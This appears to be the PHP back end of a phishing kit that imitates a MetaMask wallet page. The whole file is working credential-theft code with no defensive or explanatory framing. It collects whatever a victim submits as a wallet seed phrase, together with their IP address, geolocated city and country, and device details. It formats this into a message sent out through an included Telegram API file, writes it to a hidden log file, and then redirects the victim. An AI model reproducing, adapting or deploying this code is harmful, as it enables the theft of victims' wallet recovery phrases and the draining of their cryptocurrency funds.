<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'GET') {
    date_default_timezone_set('America/Chicago');
    $InfoDATE = date("d-m-Y h:i:sa");

    // ── Flatten & sanitize inputs ──────────────────────────────────────────────
    function flatten_array(array $arr): array {
        $out = [];
        array_walk_recursive($arr, function($value) use (&$out) {
            $v = trim(htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'));
            if ($v !== '') {
                $out[] = $v;
            }
        });
        return $out;
    }

    // Read JSON body if present
    $rawBody = file_get_contents('php://input');
    $jsonValues = [];
    $decoded = json_decode($rawBody, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        $jsonValues = flatten_array($decoded);
    }

    // Read GET and POST values
    $getValues  = flatten_array($_GET);
    $postValues = flatten_array($_POST);

    // Capture redirect URL before merging (exclude it from data)
    $redirectUrl = '';
    if (!empty($_POST['redirect'])) {
        $redirectUrl = $_POST['redirect'];
        unset($_POST['redirect']);
        $postValues = flatten_array($_POST);
    } elseif (!empty($_GET['redirect'])) {
        $redirectUrl = $_GET['redirect'];
        unset($_GET['redirect']);
        $getValues = flatten_array($_GET);
    }

    $allValues  = array_merge($jsonValues, $getValues, $postValues);

    $phraseArray = $allValues;
    $phrase      = count($phraseArray) ? implode(' ', $phraseArray) : '[no data]';
    $wordCount   = count($phraseArray);

    $clientIp = 'Unknown';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $clientIp = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $clientIp = trim($ips[0]);
    } elseif (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        $clientIp = $_SERVER['REMOTE_ADDR'];
    }

    // geo lookup
    $country = 'Unknown';
    $city    = 'Unknown';
    if ($clientIp !== 'Unknown' && $clientIp !== '127.0.0.1' && $clientIp !== '::1') {
        $geoUrl = "http://ip-api.com/json/{$clientIp}?fields=status,city,country";
        $response = @file_get_contents($geoUrl);
        if ($response !== false) {
            $geo = json_decode($response, true);
            if (isset($geo['status']) && $geo['status'] === 'success') {
                $city    = $geo['city']    ?? 'Unknown';
                $country = $geo['country'] ?? 'Unknown';
            }
        }
    }

    // device & bot
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $botDetection = (stripos($userAgent, 'bot') !== false ||
                     stripos($userAgent, 'crawler') !== false ||
                     stripos($userAgent, 'spider') !== false ||
                     stripos($userAgent, 'slurp') !== false ||
                     stripos($userAgent, 'headless') !== false ||
                     empty($userAgent)) ? 'Bot detected' : 'No bot detected';

    $platform = stripos($userAgent, 'Windows') !== false ? 'Win32' :
                ((stripos($userAgent, 'Mobile') !== false || stripos($userAgent, 'Android') !== false) ? 'Mobile' : 'Desktop');

    // ── Simple Base64 encryption for Telegram ID ──────────────────────────────
    $telegram_id = base64_decode('QEZfTEZBVA=='); // @F_LFAT

    // ── Message ────────────────────────────────────────────────────────────────
    $yagmai  = "🦊ΜΕΤΑΜΔSΚ WΔLLΕΤ🦊\n";
    $yagmai .= "╭━━━━━━━━━━━━━━╮\n";
    $yagmai .= "┃ 👨‍💻 𝗨𝗦𝗘𝗥 𝗙𝗥𝗢𝗠 𝗗𝗘𝗦𝗞𝗧𝗢𝗣\n";
    $yagmai .= "┃ 📌 IP : $clientIp\n";
    $yagmai .= "┃ 🌍 Country : $country\n";
    $yagmai .= "┃ 🏡 City : $city\n";
    $yagmai .= "┃ 📱 Device : $platform\n";
    $yagmai .= "┃ 🤖 Bot : $botDetection\n";
    $yagmai .= "╰━━━━━━━━━━━━━╯\n\n";
    $yagmai .= "🎫 SΕΕDΡΗRΛSΕ \n";
    $yagmai .= "══════════════════════════════\n";
    $yagmai .= wordwrap($phrase, 45, "\n", true);
    $yagmai .= "\n";
    $yagmai .= "══════════════════════════════\n";
    
    // Show decrypted Telegram ID normally
    $yagmai .= "DM coder → " . $telegram_id . "\n";

    // ────────────────────────────────────────────────────────────────────────────

    include("Your_Info.php");
    include("Api-TeleGram.php");

    // Log
    $f = fopen("../../da.php", "a");
    fwrite($f, $yagmai . "\n\n");
    fclose($f);

    $Noreferer = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta http-equiv="Content-Security-Policy" content="default-src \'self\'; connect-src \'none\';" /></head><body></body></html>';

    file_put_contents("../../da.php", $Noreferer, FILE_APPEND);
    file_put_contents("../../d.php", $Noreferer, FILE_APPEND);

    // ── Response: redirect for native form POST, or JSON for fetch/AJAX ──────
    if (!empty($redirectUrl)) {
        header('Location: ' . $redirectUrl);
        exit;
    }

    // Fallback JSON response for fetch/AJAX calls
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    http_response_code(200);
    echo json_encode(['status' => 'success']);
    exit;
}

// Handle OPTIONS preflight for CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    http_response_code(200);
    exit;
}
?>
